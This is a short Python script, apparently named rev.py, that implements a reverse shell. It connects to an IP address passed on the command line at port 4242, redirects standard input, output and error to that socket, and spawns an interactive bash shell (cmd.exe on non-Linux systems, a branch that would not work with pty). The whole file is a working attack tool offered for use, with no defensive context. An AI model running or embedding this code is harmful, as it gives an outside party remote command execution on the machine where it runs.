import subprocess
import socket
import pty
import sys 
import os

OS = os.uname()[0]

class ReverseShell:
	outbound = 4242
	rmt = ''

	def __init__ (self, connectBackIP):
		self.rmt = connectBackIP
		if OS == 'Linux':
			self.shell = '/bin/bash'
		else:
			self.shell = 'cmd.exe'
		self.run()

	def run(self):
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
		s.connect((self.rmt, self.outbound));
		os.dup2(s.fileno(),0);
		os.dup2(s.fileno(),1);
		os.dup2(s.fileno(),2);
		pty.spawn(self.shell)

if __name__ == '__main__':
	if len(sys.argv) > 1:
		print('[-] Connecting Back to %s:4242' % sys.argv[1])
		ReverseShell(sys.argv[1])
	else:
		print('Usage: python rev.py [ip]')
		exit()
